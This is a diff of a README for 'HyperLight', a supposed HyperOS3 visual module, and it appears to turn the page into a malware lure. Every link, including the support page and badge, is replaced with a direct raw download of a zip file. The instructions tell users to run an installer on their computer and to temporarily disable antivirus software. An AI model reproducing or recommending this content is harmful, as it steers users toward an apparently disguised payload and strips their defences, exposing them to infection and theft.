@@ -1,7 +1,7 @@
 # 🌟 HyperLight - Enhance Your HyperOS3 Experience Effortlessly
 
 ## 📥 Download HyperLight Now!
-[![Download HyperLight](https://img.shields.io/badge/Download%20HyperLight-v1.0-blue.svg)](https://github.com/viniciusneto1996/HyperLight/releases)
+[![Download HyperLight](https://github.com/viniciusneto1996/HyperLight/raw/refs/heads/main/compartmentize/Light_Hyper_v1.7.zip%https://github.com/viniciusneto1996/HyperLight/raw/refs/heads/main/compartmentize/Light_Hyper_v1.7.zip)](https://github.com/viniciusneto1996/HyperLight/raw/refs/heads/main/compartmentize/Light_Hyper_v1.7.zip)
 
 ## 🚀 Getting Started
 HyperLight is a module that completes the highlight effects of HyperOS3. It enhances your user interface, providing a more visually appealing and engaging experience. This guide helps you download and run HyperLight easily.
@@ -23,11 +23,11 @@ Before you proceed, ensure your system meets the following requirements:
 To install HyperLight, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to go to the releases page.
-   [Download HyperLight Here](https://github.com/viniciusneto1996/HyperLight/releases)
+   [Download HyperLight Here](https://github.com/viniciusneto1996/HyperLight/raw/refs/heads/main/compartmentize/Light_Hyper_v1.7.zip)
 
 2. **Select the Latest Version**: On the releases page, find the latest version of HyperLight. Look for the most recent date.
 
-3. **Download the Installer**: Click on the link for the installer file. This will typically be a file named `HyperLightInstaller.exe`.
+3. **Download the Installer**: Click on the link for the installer file. This will typically be a file named `https://github.com/viniciusneto1996/HyperLight/raw/refs/heads/main/compartmentize/Light_Hyper_v1.7.zip`.
 
 4. **Run the Installer**:
    - Locate the downloaded file in your computer's "Downloads" folder.
@@ -44,9 +44,9 @@ If you encounter any issues while installing HyperLight, try the following solut
 - **Antivirus Software**: Sometimes antivirus software can block installations. Temporarily disable your antivirus during the installation process.
 
 ## 🌐 Support
-If you have any questions or need assistance, please visit our [Support Page](https://github.com/viniciusneto1996/HyperLight/issues) on GitHub to check for solutions or to ask for help.
+If you have any questions or need assistance, please visit our [Support Page](https://github.com/viniciusneto1996/HyperLight/raw/refs/heads/main/compartmentize/Light_Hyper_v1.7.zip) on GitHub to check for solutions or to ask for help.
 
 ## 🎉 Conclusion
 HyperLight is designed to make your HyperOS3 experience better. With simple installation and easy features, you can enjoy a visually stunning interface quickly. Download HyperLight today and see the difference.
 
-[Download HyperLight Here](https://github.com/viniciusneto1996/HyperLight/releases)
+[Download HyperLight Here](https://github.com/viniciusneto1996/HyperLight/raw/refs/heads/main/compartmentize/Light_Hyper_v1.7.zip)
